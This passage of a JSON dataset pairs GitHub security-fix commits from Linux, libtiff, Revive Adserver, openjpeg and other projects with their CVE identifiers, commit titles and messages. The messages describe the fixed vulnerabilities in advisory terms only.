    "body": "Cross-Site Request Forgery (CSRF)---------------------------------Abdullah Hussam Gazi discovered that the CSRF protection mechanism introduceda few years ago to secure the forms generated with the HTML_Quickform library(most fo the forms in Revive Adserver's admin UI) could be easily bypassed bysending an empty token along with the POST data. The range of malicious actionsinclude, but is not limited to, modifying entities like banners and zones andaltering preferences and settings.CWE: CWE-352CVSSv2: 5.1 (AV:N/AC:H/Au:N/C:P/I:P/A:P)",
    "cveIds": [
      "CVE-2015-7364"
    ],
    "cveIdsCount": 1
  },
  "8ed1c3dfb91f0f6d74f9979cd0c00ed0c9871332d59d607c4f8bbd1c9397c6be": {
    "url": "https://github.com/revive-adserver/revive-adserver/commit/15aac363",
    "title": "Fix CVE-2015-7368",
    "body": "Information Exposure Through Browser Caching--------------------------------------------N B Sri Harsha has discovered that the cached copies of pages visited inRevive Adserver's Admin UI were still reachable via the browser history aftersuccesfully logging out. That could potentially expose sensitive information tounauthorised parties.CWE: CWE-525CVSSv2: 2.1 (AV:L/AC:L/Au:N/C:P/I:N/A:N)",
    "cveIds": [
      "CVE-2015-7368"
    ],
    "cveIdsCount": 1
  },
  "ef75190b7d808b9f70baf623921b76b5239f75640386e0a0d0f5a80916293930": {
    "url": "https://github.com/revive-adserver/revive-adserver/commit/86b623f8",
    "title": "Fix CVE-2015-7372",
    "body": "Local File Inclusion--------------------Krzysztof K. Wasielewski reported that the layerstyle parameter in al.php wasnot properly sanitized, causing a potential LFI vulnerability. Under normalcircumstances, an attacker would need to place a file named layerstyle.inc.phpin an arbitrary directory on the server and craft the layerstyle parameteraccordingly to load it. If an old version of PHP is being used the server,other attack techniques might be possible, e.g. NULL-byte truncation.CWE: CWE-98CVSSv2: 7.6 (AV:N/AC:H/Au:N/C:C/I:C/A:C)",
    "cveIds": [
      "CVE-2015-7372"
    ],
    "cveIdsCount": 1
  },
  "a1d37e560e02901ba033688ef6a513d1e2f02962c79d5980b17fa2a99ae8ac22": {
    "url": "https://github.com/torvalds/linux/commit/c9b92530a723ac5ef8e352885a1862b18f31b2f5",
    "title": "ext4: make orphan functions be no-op in no-journal mode",
    "body": "Instead of checking whether the handle is valid, we check if journalis enabled. This avoids taking the s_orphan_lock mutex in all caseswhen there is no journal in use, including the error paths whereext4_orphan_del() is called with a handle set to NULL.Signed-off-by: Anatol Pomozov <anatol.pomozov@gmail.com>Signed-off-by: \"Theodore Ts'o\" <tytso@mit.edu>",
    "cveIds": [
      "CVE-2015-7509"
    ],
    "cveIdsCount": 1
  },
  "3d96b7082d23820e000776f26fed654b5e9f8fb29eb686b740ca46054ee24238": {
    "url": "https://github.com/keszybz/systemd/commit/cb31827d62066a04b02111df3052949fda4b6888",
    "title": "nss-mymachines: do not allow overlong machine names",
    "body": "systemd#2002",
    "cveIds": [
      "CVE-2015-7510"
    ],
    "cveIdsCount": 1
  },
  "6118492ae1291216991415aa3e9cb03cfbb15616c929717af5b11e4689ef9f1b": {
    "url": "https://github.com/Unrud/Radicale/commit/4bfe7c9f7991d534c8b9fbe153af9d341f925f98",
    "title": "Prevent \"regex injection\"",
    "body": "If an attacker is able to authenticate with a user name like .* he can bypass limitations imposed by \"owner_write\" and \"owner_only\".",
    "cveIds": [
      "CVE-2015-8748"
    ],
    "cveIdsCount": 1
  },
  "d5390d6bd7c1c5934231acd896d04736452c551f5465b9a64b6176a97a8fb252": {
    "url": "https://github.com/gosa-project/gosa-core/commit/a67a047cba2cdae8bccb0f0e2bc6d3eb45cfcbc8",
    "title": "(See #1221)",
    "body": "udpate samba hash generation due to a possible code injectioncommand line parameter will be passed base64 encoded to avoid complex escaping sequences that may alter the initial passphrasegit-svn-id: https://oss.gonicus.de/repositories/gosa/trunk@21280 594d385d-05f5-0310-b6e9-bd551577e9d8",
    "cveIds": [
      "CVE-2015-8771"
    ],
    "cveIdsCount": 1
  },
  "506c14134f65d5ae9e0d40d05d58e4774898a03c737f9bf4b151ae3f875f49da": {
    "url": "https://github.com/vadz/libtiff/commit/b18012dae552f85dcc5c57d3bf4e997a15b1cc1c",
    "title": "* libtiff/tif_next.c: fix potential out-of-bound write in NeXTDecode()",
    "body": "triggered by http://lcamtuf.coredump.cx/afl/vulns/libtiff5.tif(bugzilla #2508)",
    "cveIds": [
      "CVE-2015-8784"
    ],
    "cveIdsCount": 1
  },
  "e059405b624b163b4bb04b2e3f9fed5ec4931f2411fbcbb5a4dffbf51fa0904e": {
    "url": "https://github.com/torvalds/linux/commit/3ca8138f014a913f98e6ef40e939868e1e9ea876",
    "title": "fuse: break infinite loop in fuse_fill_write_pages()",
    "body": "I got a report about unkillable task eating CPU. Furtherinvestigation shows, that the problem is in the fuse_fill_write_pages()function. If iov's first segment has zero length, we get an infiniteloop, because we never reach iov_iter_advance() call.Fix this by calling iov_iter_advance() before repeating an attempt tocopy data from userspace.A similar problem is described in 124d3b7 (\"fix writev regression:pan hanging unkillable and un-straceable\"). If zero-length segmendis followed by segment with invalid address,iov_iter_fault_in_readable() checks only first segment (zero-length),iov_iter_copy_from_user_atomic() skips it, fails at second andreturns zero -> goto again without skipping zero-length segment.Patch calls iov_iter_advance() before goto again: we'll skip zero-lengthsegment at second iteraction and iov_iter_fault_in_readable() will detectinvalid address.Special thanks to Konstantin Khlebnikov, who helped a lot with the commitdescription.Cc: Andrew Morton <akpm@linux-foundation.org>Cc: Maxim Patlasov <mpatlasov@parallels.com>Cc: Konstantin Khlebnikov <khlebnikov@yandex-team.ru>Signed-off-by: Roman Gushchin <klamm@yandex-team.ru>Signed-off-by: Miklos Szeredi <miklos@szeredi.hu>Fixes: ea9b990 (\"fuse: implement perform_write\")Cc: <stable@vger.kernel.org>",
    "cveIds": [
      "CVE-2015-8785"
    ],
    "cveIdsCount": 1
  },
  "9ad8118953e3807c66970b2b0fb527c591da1a8b58ff9b61a96c1264d0d1e123": {
    "url": "https://github.com/Matroska-Org/libebml/commit/ababb64e0c792ad2a314245233db0833ba12036b",
    "title": "EbmlUnicodeString: don't read beyond end of string",
    "body": "The conversion from an UTF-8 encoded string into a wchar_t one wasreading from beyond the end of the source buffer if the length indicatedby a UTF-8 character's first byte exceeds the number of bytes actuallypresent afterwards.Fixes the issue reported as Cisco TALOS-CAN-0036.",
    "cveIds": [
      "CVE-2015-8790"
    ],
    "cveIdsCount": 1
  },
  "1f887e44b7339510e84d1227b29fd01b62f5fbf866a5f2f46590bf29af0ebcc2": {
    "url": "https://github.com/Matroska-Org/libebml/commit/24e5cd7c666b1ddd85619d60486db0a5481c1b90",
    "title": "EbmlElement: don't read beyond end of buffer when reading variable le…",
    "body": "…ngth integers",
    "cveIds": [
      "CVE-2015-8791"
    ],
    "cveIdsCount": 1
  },
  "c741461dc63889f9bec0dc4e75dc9fda4f7513c0d086da12509878262821f93f": {
    "url": "https://github.com/horde/horde/commit/11d74fa5a22fe626c5e5a010b703cd46a136f253",
    "title": "Escape form value.",
    "body": "Even though this is a numeric field, this isn't enforced untilthe form is submitted.",
    "cveIds": [
      "CVE-2015-8807"
    ],
    "cveIdsCount": 1
  },
  "ddd7632a413e1f71ed73dd23e97f1cb3f3df39a8b1991f6223c248023b13be7a": {
    "url": "https://github.com/umbraco/Umbraco-CMS/commit/18c3345e47663a358a042652e697b988d6a380eb",
    "title": "Fixes U4-7459 XSRF protection bypass - ensures tokens are checked for…",
    "body": "… the non-editor api controllers",
    "cveIds": [
      "CVE-2015-8814"
    ],
    "cveIdsCount": 1
  },
  "79fee6f01374636cf75bd6b45e2bd8d232dda1b8117a1dbc73a479e594a99905": {
    "url": "https://github.com/systemd/systemd/commit/afae249efa4774c6676738ac5de6aeb4daf4889f",
    "title": "tmpfiles: set acls on system.journal explicitly",
    "body": "#1397",
    "cveIds": [
      "CVE-2015-8842"
    ],
    "cveIdsCount": 1
  },
  "78f3dcf09d77d6dfa096ca4994c7b1889628ca81777a13c14cd2e172c1a7b8e8": {
    "url": "https://github.com/torvalds/linux/commit/d2b9d2a5ad5ef04ff978c9923d19730cb05efd55",
    "title": "powerpc/tm: Block signal return setting invalid MSR state",
    "body": "Currently we allow both the MSR T and S bits to be set by userspace ona signal return. Unfortunately this is a reserved configuration andwill cause a TM Bad Thing exception if attempted (via rfid).This patch checks for this case in both the 32 and 64 bit signalscode. If both T and S are set, we mark the context as invalid.Found using a syscall fuzzer.Fixes: 2b0a576 (\"powerpc: Add new transactional memory state to the signal context\")Cc: stable@vger.kernel.org # v3.9+Signed-off-by: Michael Neuling <mikey@neuling.org>Signed-off-by: Michael Ellerman <mpe@ellerman.id.au>",
    "cveIds": [
      "CVE-2015-8844"
    ],
    "cveIdsCount": 1
  },
  "b252cc7a0589ba7735ff5dcadd7d8c00407697d9f69459abe8ec3d81bf972011": {
    "url": "https://github.com/stedolan/jq/commit/8eb1367ca44e772963e704a700ef72ae2e12babd",
    "title": "Heap buffer overflow in tokenadd() (fix #105)",
    "body": "This was an off-by one: the NUL terminator byte was not allocated onresize. This was triggered by JSON-encoded numbers longer than 256bytes.",
    "cveIds": [
      "CVE-2015-8863"
    ],
    "cveIdsCount": 1
  },
  "5d0eca78f55901fe799575daa6ef941b7f54aaa8496680e1283f283d3546a0ed": {
    "url": "https://github.com/file/file/commit/6713ca45e7757297381f4b4cdb9cf5e624a9ad36",
    "title": "PR/454: Fix memory corruption when the continuation level jumps by mo…",
    "body": "…re than20 in a single step.",
    "cveIds": [
      "CVE-2015-8865"
    ],
    "cveIdsCount": 1
  },
  "d44306c936b8cc9485cd434b2f2fd5e13372c6b5893746b02aa28f2580eb0a83": {
    "url": "https://github.com/ocaml/ocaml/commit/659615c7b100a89eafe6253e7a5b9d84d0e8df74#diff-a97df53e3ebc59bb457191b496c90762",
    "title": "fix PR#7003 and a few other bugs caused by misuse of Int_val",
    "body": "git-svn-id: http://caml.inria.fr/svn/ocaml/trunk@16525 f963ae5c-01c2-4b8c-9fe0-0dff7051ff02",
    "cveIds": [
      "CVE-2015-8869"
    ],
    "cveIdsCount": 1
  },
  "29d963ab41799e5c4560ad04472fd215d474d3214506bb9c2cafc7b9e3a7997b": {
    "url": "https://github.com/uclouvain/openjpeg/commit/940100c28ae28931722290794889cf84a92c5f6f",
    "title": "Fix potential use-after-free in opj_j2k_write_mco function",
    "body": "Fixes #563",
    "cveIds": [
      "CVE-2015-8871"
    ],
    "cveIdsCount": 1
  },
  "f04f739ec9afb0c27f63994e070bd71c29571f1079b61d5f0dfe8fbb227422ca": {
    "url": "https://github.com/dosfstools/dosfstools/commit/07908124838afcc99c577d1d3e84cef2dbd39cb7",
    "title": "set_fat(): Fix off-by-2 error leading to corruption in FAT12",
    "body": "In FAT12 two 12 bit entries are combined to a 24 bit value (threebytes). Therefore, when an even numbered FAT entry is set in FAT12, itmust be be combined with the following entry. To prevent accessingbeyond the end of the FAT array, it must be checked that the cluster isnot the last one.Previously, the check tested that the requested cluster was equal tofs->clusters - 1. However, fs->clusters is the number of data clustersnot including the two reserved FAT entries at the start so the testtriggered two clusters early.If the third to last entry was written on a FAT12 filesystem with anodd number of clusters, the second to last entry would be corrupted.This corruption may also lead to invalid memory accesses when thecorrupted entry becomes out of bounds and is used later.Change the test to fs->clusters + 1 to fix.Reported-by: Hanno BöckSigned-off-by: Andreas Bombe <aeb@debian.org>",
    "cveIds": [
      "CVE-2015-8872"
    ],
    "cveIdsCount": 1
  },
  "28eb1756c5b40a778d022d4761bb6b0332ceb2bea317049b0aa32b00662a40cd": {
    "url": "https://github.com/libgd/libgd/commit/4751b606fa38edc456d627140898a7ec679fcc24",
    "title": "gdImageScaleTwoPass memory leak fix",
    "body": "Fixing memory leak in gdImageScaleTwoPass, as reported by @cmb69 andconfirmed by @vapier. This bug actually bit me in production and I'mvery thankful that it was reported with an easy fix.Fixes #173.",
    "cveIds": [
      "CVE-2015-8877"
    ],
    "cveIdsCount": 1
  },
  "d09291e017a058b07b3e23348d21e669de7018095d97b05ac10842bc2276f73a": {
    "url": "https://github.com/behdad/harfbuzz/commit/f96664974774bfeb237a7274f512f64aaafb201e",
    "title": "Fix another memory access issue discovered by libFuzzer",
    "body": "Fixes #139 (comment)",
    "cveIds": [
      "CVE-2015-8947"
    ],
    "cveIdsCount": 1
  },
  "6ba73ed4e1c7447a0a2f630f9780f7ec42f020064b486ec35a00c0e32bcd56c5": {
    "url": "https://github.com/perl5-dbi/DBD-mysql/commit/cf0aa7751f6ef8445e9310a64b14dc81460ca156",
    "title": "Merge pull request #45 from hannob/master",
    "body": "Fix use after free error.",
    "cveIds": [
      "CVE-2015-8949"
    ],
    "cveIdsCount": 1
  },
  "7d590521240e4de8c5048e867f52f7d79c189e525adfb494a1689d9cc58b2b24": {
    "url": "https://github.com/qpdf/qpdf/commit/701b518d5c56a1449825a3a37a716c58e05e1c3e",
    "title": "Detect recursion loops resolving objects (fixes #51)",
    "body": "During parsing of an object, sometimes parts of the object have to beresolved. An example is stream lengths. If such an object directly orindirectly points to the object being parsed, it can cause an infiniteloop. Guard against all cases of re-entrant resolution of objects.",
    "cveIds": [
      "CVE-2015-9252"
    ],
    "cveIdsCount": 1
  },
  "31e4bfc229385b89830f72814bf70e91f7f436e2a7a9b245d5f42c7b4424edcf": {
    "url": "https://github.com/harfbuzz/harfbuzz/commit/c917965b9e6fe2b21ed6c51559673288fa3af4b7",
    "title": "Add missing returns",
    "body": "Fixes possible invalid read of two bytes.Reported by Behzad Najjarpour Jabbari, Secunia Research.",
    "cveIds": [
      "CVE-2015-9274"
    ],
    "cveIdsCount": 1
  },
  "c14775d8ecfd6d9032054cf9a0673539c6e7a194f2de95b3c33726d312d5ee2c": {
    "url": "https://github.com/torvalds/linux/commit/1fa2337a315a2448c5434f41e00d56b01a22283c",
    "title": "[media] cx24116: fix a buffer overflow when checking userspace params",
    "body": "The maximum size for a DiSEqC command is 6, according to theuserspace API. However, the code allows to write up much more values:drivers/media/dvb-frontends/cx24116.c:983 cx24116_send_diseqc_msg() error: buffer overflow 'd->msg' 6 <= 23Cc: stable@vger.kernel.orgSigned-off-by: Mauro Carvalho Chehab <mchehab@osg.samsung.com>",
    "cveIds": [
      "CVE-2015-9289"
    ],
    "cveIdsCount": 1
  },
  "f5b9d71c35321c014dae3d29cd98d295a63394c068f3c2240c6539f838d82089": {
    "url": "https://github.com/braekling/WP-Matomo/commit/5110bfdb437a9f19b185ba8af33776fcb5e19940",
    "title": "Security fix + translations",
    "body": "Security fix (XSS vulnerability) + several updated translations:Portuguese (Brazil), Italian, Albanian",
    "cveIds": [
      "CVE-2015-9405"
    ],
    "cveIdsCount": 1
  },
  "7d7e3e21a8fc2b0eec61fc0da2f861569907b09e85408fa9b442ccbf6068b7b4": {
    "url": "https://github.com/duchenerc/artificial-intelligence/commit/c70631b1f80518411df2f88476041351110c6eac",
    "title": "Fix potential XSS vulnerability with Genericons",
    "body": "Delete bundled example.htmlRemove unecessary Genericons readme",
    "cveIds": [
      "CVE-2015-9501"
    ],
    "cveIdsCount": 1
  },
  "8fb70c200eed52e6e18f3a30384850302b5fcd2993ac8609ba571ee65755962f": {
    "url": "https://github.com/ClusterLabs/pcs/commit/b9e7f061788c3b86a0c67d2d4158f067ec5eb625",
    "title": "fix CSRF vulnerability",
    "body": "* requests /remote/* (GET and POST) and /run_pcs are accessible only with token authentication * all web UI requests are accessible only with session authentication * all web UI requests (except for /manage, /managec/<cluster>/main, /permissions ) must include header: X-Requested-With: XMLHttpRequest",
    "cveIds": [
      "CVE-2016-0720"
    ],
    "cveIdsCount": 1
  },
  "49d92b05b1274e147b9a42c0f40749eed31afa6372f13ea575ec0b9540eb3de9": {
    "url": "https://github.com/torvalds/linux/commit/5c17c861a357e9458001f021a7afa7aab9937439",
    "title": "tty: Fix unsafe ldisc reference via ioctl(TIOCGETD)",
    "body": "ioctl(TIOCGETD) retrieves the line discipline id directly from theldisc because the line discipline id (c_line) in termios is untrustworthy;userspace may have set termios via ioctl(TCSETS*) without actuallychanging the line discipline via ioctl(TIOCSETD).However, directly accessing the current ldisc via tty->ldisc isunsafe; the ldisc ptr dereferenced may be stale if the line disciplineis changing via ioctl(TIOCSETD) or hangup.Wait for the line discipline reference (just like read() or write())to retrieve the \"current\" line discipline id.Cc: <stable@vger.kernel.org>Signed-off-by: Peter Hurley <peter@hurleysoftware.com>Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>",
    "cveIds": [
      "CVE-2016-0723"
    ],
    "cveIdsCount": 1
  },
  "466e70946d520e4d45dbc2381ee9a8027502d791a02701663502cbcca27af18c": {
    "url": "https://github.com/torvalds/linux/commit/ab676b7d6fbf4b294bf198fb27ade5b0e865c7ce",
    "title": "pagemap: do not leak physical addresses to non-privileged userspace",
    "body": "As pointed by recent post[1] on exploiting DRAM physical imperfection,/proc/PID/pagemap exposes sensitive information which can be used to doattacks.This disallows anybody without CAP_SYS_ADMIN to read the pagemap.[1] http://googleprojectzero.blogspot.com/2015/03/exploiting-dram-rowhammer-bug-to-gain.html[ Eventually we might want to do anything more finegrained, but for now this is the simple model. - Linus ]Signed-off-by: Kirill A. Shutemov <kirill.shutemov@linux.intel.com>Acked-by: Konstantin Khlebnikov <khlebnikov@openvz.org>Acked-by: Andy Lutomirski <luto@amacapital.net>Cc: Pavel Emelyanov <xemul@parallels.com>Cc: Andrew Morton <akpm@linux-foundation.org>Cc: Mark Seaborn <mseaborn@chromium.org>Cc: stable@vger.kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2016-0823"
    ],
    "cveIdsCount": 1
  },
  "1259a3ad2be72574452f47b30c3504d18c5d286350c4e16dcc3d95b097510139": {
    "url": "https://github.com/salesforce/tough-cookie/commit/e4fc2e0f9ee1b7a818d68f0ac7ea696f377b1534",
    "title": "Reduce parse time for many semicolons.",
    "body": "Bug Credit To: David Kirchner <dpk@stream.me>",
    "cveIds": [
      "CVE-2016-1000232"
    ],
    "cveIdsCount": 1
  },
  "86863138c70d030eb1cdcb2c5c7d848e682c34721b952d6442053a0aacd45141": {
    "url": "https://github.com/salesforce/tough-cookie/commit/615627206357d997d5e6ff9da158997de05235ae",
    "title": "Merge pull request #68 from SalesforceEng/fix-too-many-semicolons",
    "body": "Reduce parse time for many semicolons.",
    "cveIds": [
      "CVE-2016-1000232"
    ],
    "cveIdsCount": 1
  },
  "8cfb0321e3161d0af72fc6714a0c6fe2bac3fe5df478561bbfb7c22af57c6481": {
    "url": "https://github.com/bcgit/bc-java/commit/8a73f08931450c17c749af067b6a8185abdfd2c0#diff-494fb066bed02aeb76b6c005632943f2",
    "title": "Added table use obfuscation to AESFastEngine",
    "body": "JDK 1.4 compiler updates.",
    "cveIds": [
      "CVE-2016-1000339"
    ],
    "cveIdsCount": 1
  },
  "2eb3cc2aed6e142450a703ed9966cc516d0863117c69dec979260412fa318267": {
    "url": "https://github.com/bcgit/bc-java/commit/413b42f4d770456508585c830cfcde95f9b0e93b#diff-54656f860db94b867ba7542430cd2ef0",
    "title": "added better support for DH domain parameters",
    "body": "added s box allocation to AESEnginereduced use of AESFastEngine.",
    "cveIds": [
      "CVE-2016-1000339"
    ],
    "cveIdsCount": 1
  },
  "950ca6259804ec3288a7a209599df0cbe5651c9c5d617f3c1135c920b8f1f73b": {
    "url": "https://github.com/openbsd/src/commit/3095060f479b86288e31c79ecbc5131a66bcd2f9",
    "title": "Remove support for pre-authentication compression. Doing compression",
    "body": "early in the protocol probably seemed reasonable in the 1990s, buttoday it's clearly a bad idea in terms of both cryptography (cf.multiple compression oracle attacks in TLS) and attack surface.Moreover, to support it across privilege-separation zlib neededthe assistance of a complex shared-memory manager that made therequired attack surface considerably larger.Prompted by Guido Vranken pointing out a compiler-elided securitycheck in the shared memory manager found by Stack(http://css.csail.mit.edu/stack/); ok deraadt@ markus@NB. pre-auth authentication has been disabled by default in sshdfor >10 years.",
    "cveIds": [
      "CVE-2016-10012"
    ],
    "cveIdsCount": 1
  },
  "a7bb1dca3e2dda37c5b4b77a061288f6c974c462505328e9c72849e89eebac77": {
    "url": "https://github.com/mdadams/jasper/commit/2e82fa00466ae525339754bb3ab0a0474a31d4bd",
    "title": "Fixed an integral type promotion problem by adding a JAS_CAST.",
    "body": "Modified the jpc_tsfb_synthesize function so that it will be a noop foran empty sequence (in order to avoid dereferencing a null pointer).",
    "cveIds": [
      "CVE-2016-10248"
    ],
    "cveIdsCount": 1
  },
  "31e311cc40992619fd7f67f23265ab46c5a233b75b9dbf61363d40984835d37f": {
    "url": "https://github.com/mdadams/jasper/commit/1f0dfe5a42911b6880a1445f13f6d615ddb55387",
    "title": "Fixed an integer overflow problem in the JPC codec that later resulted",
    "body": "in the use of uninitialized data.",
    "cveIds": [
      "CVE-2016-10251"
    ],
    "cveIdsCount": 1
  },
  "92dbfcb453f183b91b8dd9784492a853ccfb60a91e2c5e5b065dd0d4dd323847": {
    "url": "https://github.com/vadz/libtiff/commit/1044b43637fa7f70fb19b93593777b78bd20da86",
    "title": "* libtiff/tif_pixarlog.c, libtiff/tif_luv.c: fix heap-based buffer",
    "body": "overflow on generation of PixarLog / LUV compressed files, withColorMap, TransferFunction attached and nasty plays with bitspersample.The fix for LUV has not been tested, but suffers from the same kindof issue of PixarLog.Reported by Agostino Sarubbo.Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2604",
    "cveIds": [
      "CVE-2016-10269"
    ],
    "cveIdsCount": 1
  },
  "a00e7c0226eed5eeea7602beac62dc4ae83fde26c1155f4997d1a1642f1e3ec3": {
    "url": "https://github.com/vadz/libtiff/commit/9a72a69e035ee70ff5c41541c8c61cd97990d018",
    "title": "* libtiff/tif_dirread.c: modify ChopUpSingleUncompressedStrip() to",
    "body": "instanciate compute ntrips as TIFFhowmany_32(td->td_imagelength, rowsperstrip),instead of a logic based on the total size of data. Which is faulty isthe total size of data is not sufficient to fill the whole image, and thusresults in reading outside of the StripByCounts/StripOffsets arrays whenusing TIFFReadScanline().Reported by Agostino Sarubbo.Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2608.* libtiff/tif_strip.c: revert the change in TIFFNumberOfStrips() donefor http://bugzilla.maptools.org/show_bug.cgi?id=2587 / CVE-2016-9273 sincethe above change is a better fix that makes it unnecessary.",
    "cveIds": [
      "CVE-2016-10270"
    ],
    "cveIdsCount": 1
  },
  "f9cacf9d84f0b40f790357146d647cca0aa9599267948c56b815bd852070824a": {
    "url": "https://github.com/vadz/libtiff/commit/9657bbe3cdce4aaa90e07d50c1c70ae52da0ba6a",
    "title": "* tools/tiffcrop.c: fix readContigStripsIntoBuffer() in -i (ignore) m…",
    "body": "…ode sothat the output buffer is correctly incremented to avoid write outside bounds.Reported by Agostino Sarubbo.Fixes http://bugzilla.maptools.org/show_bug.cgi?id=2620",
    "cveIds": [
      "CVE-2016-10271",
      "CVE-2016-10272"
    ],
    "cveIdsCount": 2
  },
  "03f25b6dbc17524261e868b60aca27253f02b2b1510f15eb7da7eda56af038de": {
    "url": "https://github.com/torvalds/linux/commit/163ae1c6ad6299b19e22b4a35d5ab24a89791a98",
    "title": "fscrypto: add authorization check for setting encryption policy",
    "body": "On an ext4 or f2fs filesystem with file encryption supported, a usercould set an encryption policy on any empty directory(*) to which theyhad readonly access. This is obviously problematic, since such adirectory might be owned by another user and the new encryption policywould prevent that other user from creating files in their own directory(for example).Fix this by requiring inode_owner_or_capable() permission to set anencryption policy. This means that either the caller must own the file,or the caller must have the capability CAP_FOWNER.(*) Or also on any regular file, for f2fs v4.6 and later and ext4 v4.8-rc1 and later; a separate bug fix is coming for that.Signed-off-by: Eric Biggers <ebiggers@google.com>Cc: stable@vger.kernel.org # 4.1+; check fs/{ext4,f2fs}Signed-off-by: Theodore Ts'o <tytso@mit.edu>",
    "cveIds": [
      "CVE-2016-10318"
    ],
    "cveIdsCount": 1
  },
  "fb911796ceef73f9b7178566aba7c692c4a93b25d8cc590a8e3cdb1e4abdb2d6": {
    "url": "https://github.com/LibreOffice/core/commit/7485fc2a1484f31631f62f97e5c64c0ae74c6416",
    "title": "Resolves: ofz#313 cbBmiSrc > getDIBV5HeaderSize",
    "body": "Change-Id: I67fb67dc0a4cb609b8f1391c1eb6dd395755a933",
    "cveIds": [
      "CVE-2016-10327"
    ],
    "cveIdsCount": 1
  },
  "11e148092e91a9ad66f112b559c0b2f858eb5dc30f8427b78acfe217e5d05c02": {
    "url": "https://github.com/phusion/passenger/commit/e5b4b0824d6b648525b4bf63d9fa37e5beeae441",
    "title": "Fix writing a tmp file with a predictable name in",
    "body": "passenger-install-nginx-module.With access to the system, a user could plant a symlink in /tmp thatresulted in a chosen-file overwrite attempt wheneverpassenger-install-nginx-module was run, using the access rights ofthe executing user, potentially even with chosen content.",
    "cveIds": [
      "CVE-2016-10345"
    ],
    "cveIdsCount": 1
  },
  "8dcdfd568a1cf43b60717e0a5a151bd8333b7d436cb63755fbe223c5cfc544e6": {
    "url": "https://github.com/telegramdesktop/tdesktop/pull/3842/commits/388703b9ca1912a5438e37f9dd54c35805f2c594",
    "title": "Fix CVE-2016-10351: Insecure cWorkingDir permissions.",
    "body": "Set 700 permisson on dir on every start.Signed-off-by: Alexander GQ Gerasiov <gq@cs.msu.su>",
    "cveIds": [
      "CVE-2016-10351"
    ],
    "cveIdsCount": 1
  },
  "dc87735393947b8544b9bb74b30c4c08b3c36e62c4ce4346ed8a2594e17fdbac": {
    "url": "https://github.com/uclouvain/openjpeg/commit/397f62c0a838e15d667ef50e27d5d011d2c79c04",
    "title": "Fix write heap buffer overflow in opj_mqc_byteout(). Discovered by Ke…",
    "body": "… Liu of Tencent's Xuanwu LAB (#835)",
    "cveIds": [
      "CVE-2016-10504"
    ],
    "cveIdsCount": 1
  },
  "d2fd3fff954abd392b7e3b94da0c2c3f70ed6825001ae3dd98d1db0202664946": {
    "url": "https://github.com/uclouvain/openjpeg/commit/da940424816e11d624362ce080bc026adffa26e8",
    "title": "Merge pull request #834 from trylab/issue833",
    "body": "Fix issue 833.",
    "cveIds": [
      "CVE-2016-10507"
    ],
    "cveIdsCount": 1
  },
  "c5208c27b53a6c47e5e75387d346b79052a97a3c462af36f9fc3201e30509961": {
    "url": "https://github.com/JamesHeinrich/phpThumb/commit/162ae709162be3e6c4d942313a278ca5cbdb8e92",
    "title": "demo.showpic security fix",
    "body": "Sanitize input data to prevent Reflected XSS problems",
    "cveIds": [
      "CVE-2016-10508"
    ],
    "cveIdsCount": 1
  },
  "f76ea927a765220d67cd3b3aa378043afd16a1f9414ef018ce3be61454419b07": {
    "url": "https://github.com/Piwigo/Piwigo/commit/9a93d1f44b06605af84520509e7a0e8b64ab0c05",
    "title": "fixes #548, escape HTML chars from search expression",
    "body": "before sending them to HTML comment on frontend",
    "cveIds": [
      "CVE-2016-10513"
    ],
    "cveIdsCount": 1
  },
  "80ad7ef63711265e260e7ad06a6383d83376eb13f1b7b537155ace0bba5a1a35": {
    "url": "https://github.com/sferik/rails_admin/commit/b13e879eb93b661204e9fb5e55f7afa4f397537a",
    "title": "[Security] Fixes CSRF vulnerability, introduced by 53eef4f",
    "body": "Reported by SourceClear, Inc.",
    "cveIds": [
      "CVE-2016-10522"
    ],
    "cveIdsCount": 1
  },
  "43657e467e2cad65526e964d577a209d205c6c33d2135ce6570d44e16a20b3e2": {
    "url": "https://github.com/perl5-dbi/DBD-mysql/commit/3619c170461a3107a258d1fd2d00ed4832adb1b1",
    "title": "Fix use-after-free for repeated fetchrow_arrayref calls when mysql_se…",
    "body": "…rver_prepare=1Function dbd_st_fetch() via Renew() can reallocate output buffer formysql_stmt_fetch() call. But it does not update pointer to that buffer inimp_sth->stmt structure initialized by mysql_stmt_bind_result() function.That leads to use-after-free in any mysql function which accessimp_sth->stmt structure (e.g. mysql_stmt_fetch()).This patch fix this problem and properly updates pointer in imp_sth->stmtstructure after Renew() call.Test 40server_prepare_crash.t is extended to check for that use-after-freecrash.",
    "cveIds": [
      "CVE-2016-1251"
    ],
    "cveIdsCount": 1
  },
  "85ac3ab9a92b0b5077ddd4ba32b6b38254f4ffc1285b369a906f74919b10f433": {
    "url": "https://github.com/libarchive/libarchive/commit/d0331e8e5b05b475f20b1f3101fe1ad772d7e7e7",
    "title": "Issue #656: Fix CVE-2016-1541, VU#862384",
    "body": "When reading OS X metadata entries in Zip archives that were storedwithout compression, libarchive would use the uncompressed entry sizeto allocate a buffer but would use the compressed entry size to limitthe amount of data copied into that buffer. Since the compressedand uncompressed sizes are provided by data in the archive itself,an attacker could manipulate these values to write data beyondthe end of the allocated buffer.This fix provides three new checks to guard against suchmanipulation and to make libarchive generally more robust whenhandling this type of entry: 1. If an OS X metadata entry is stored without compression, abort the entire archive if the compressed and uncompressed data sizes do not match. 2. When sanity-checking the size of an OS X metadata entry, abort this entry if either the compressed or uncompressed size is larger than 4MB. 3. When copying data into the allocated buffer, check the copy size against both the compressed entry size and uncompressed entry size.",
    "cveIds": [
      "CVE-2016-1541"
    ],
    "cveIdsCount": 1
  },
  "96d250b9090b7703942b7fbb822b785b37ab7fb3669e9ecc21cb13ee2f384295": {
    "url": "https://github.com/torvalds/linux/commit/2f36db71009304b3f0b95afacd8eba1f9f046b87",
    "title": "ecryptfs: forbid opening files without mmap handler",
    "body": "This prevents users from triggering a stack overflow through a recursiveinvocation of pagefault handling that involves mapping procfs files intovirtual memory.Signed-off-by: Jann Horn <jannh@google.com>Acked-by: Tyler Hicks <tyhicks@canonical.com>Cc: stable@vger.kernel.orgSigned-off-by: Linus Torvalds <torvalds@linux-foundation.org>",
    "cveIds": [
      "CVE-2016-1583"
    ],
    "cveIdsCount": 1
  },
  "a9d5f0478227447b474920386c9edd18d21856b0628ea75fab27578c93d8721a": {
    "url": "https://github.com/torvalds/linux/commit/f5364c150aa645b3d7daa21b5c0b9feaa1c9cd6d",
